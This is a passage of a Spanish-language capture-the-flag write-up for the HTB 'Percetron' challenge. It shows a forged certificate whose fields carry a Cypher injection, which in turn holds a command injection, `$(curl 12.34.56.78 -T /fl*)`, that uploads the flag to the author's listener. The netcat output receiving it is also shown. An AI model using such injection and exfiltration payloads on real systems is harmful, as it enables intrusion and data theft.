</code></pre></div><p>En este punto, podríamos enviarnos la <em>flag</em> desde el contenedor remoto a un servidor controlado, solo necesitamos insertar el <em>payload</em> de inyección de comandos anterior dentro del nombre de archivo que estará dentro de el <em>payload</em> de inyección Cypher.</p><p>Para esto, aprovecharemos una función llamada <code>generateCert</code> en <code>challenge/util/x509.js</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt; const { generateCert } = require('./util/x509')
<span class="code-grey">undefined</span>
&gt; let cert = generateCert(`', file_name: '/app/$(curl 12.34.56.78 -T /fl*)/asdf.crt', /*`, `*/ org_name: 'asdf`, 'locality', 'state', 'ES')  
<span class="code-grey">undefined</span>
&gt; console.log(cert.cert)
-----BEGIN CERTIFICATE-----
MIIDrTCCApWgAwIBAgIBATANBgkqhkiG9w0BAQUFADCBmTELMAkGA1UEBhMCRVMx
...
6Lj/RMVsOEvramCErbiJ0IaH9JVO6zVKfT8MnKCPo9Ot
-----END CERTIFICATE-----

<span class="code-grey">undefined</span>
&gt; console.log(cert.pubKey)
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuQEtEZk88w55N6LFlnhe
...
JQIDAQAB
-----END PUBLIC KEY-----

<span class="code-grey">undefined</span>
&gt; console.log(cert.privKey)
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAuQEtEZk88w55N6LFlnheKcSJ7i9HUQFyFX5aVIOUhkXgKLq5
...
UilBqoI2Lh2gkm9NuIDAchuYYk+sOfVd1AWqWKuAEO0F1UX1WqjZ
-----END RSA PRIVATE KEY-----

<span class="code-grey">undefined</span>
</code></pre></div><p>No todas las cargas útiles de inyección de comandos funcionaron, pero después de algunas pruebas podemos obtener una que funcione.</p><p>Ahora, simplemente copiamos el certificado anterior, la clave pública y la clave privada en la aplicación web:</p><p><img alt="Percetron 10" src="/images/other/HTB%20Cyber%20Apocalypse%202024/Percetron-10.webp"></p><p>Luego, guardamos el certificado y finalmente hacemos click en &ldquo;<em>Download All</em>&rdquo;.</p><h2 id="_flag_"><em>Flag</em></h2><p>El servidor ejecutará nuestro <em>payload</em> de inyección de comandos y enviará la <em>flag</em> a nuestro servidor controlado:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 80
Listening on 0.0.0.0 80
Connection received on 83.136.254.142 35628  
PUT /flag1e34fd6a77.txt HTTP/1.1
Host: 12.34.56.78
User-Agent: curl/7.70.0
Accept: */*
Content-Length: 40
Expect: 100-continue

HTB{br34k_f1r3wal1s_4nd_bypas5_m34sur35}
</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#análisis-del-código-fuente">Análisis del código fuente</a></li><li><a href="#explotación-de-ssrf">Explotación de SSRF</a><ul><li><a href="#mongodb-_wire-protocol_">MongoDB <em>Wire Protocol</em></a></li><li><a href="#protocolo-gopher">Protocolo Gopher</a></li><li><a href="#intentos-fallidos">Intentos fallidos</a></li><li><a href="#http-_request-smuggling_">HTTP <em>request smuggling</em></a></li></ul></li><li><a href="#obteniendo-rce">Obteniendo RCE</a><ul><li><a href="#inyección-cypher-neo4j">Inyección Cypher (neo4j)</a></li><li><a href="#inyección-de-comandos">Inyección de comandos</a></li></ul></li><li><a href="#_flag_"><em>Flag</em></a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter" target="popupwindow" onsubmit='return window.open("https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter"),!0'><h3 class="tc">7Rocky's Blog Weekly Newsletter</h3><p class="tc"><input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Recibe un resumen semanal del blog"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Suscribirse"><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">Ver historial de resúmenes</a></p><p class="tc">impulsado por <a href="http://www.mailchimp.com" target="_blank" title="Mailchimp">Mailchimp</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; Blog de 7Rocky. Ciberseguridad y Mates 2024</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>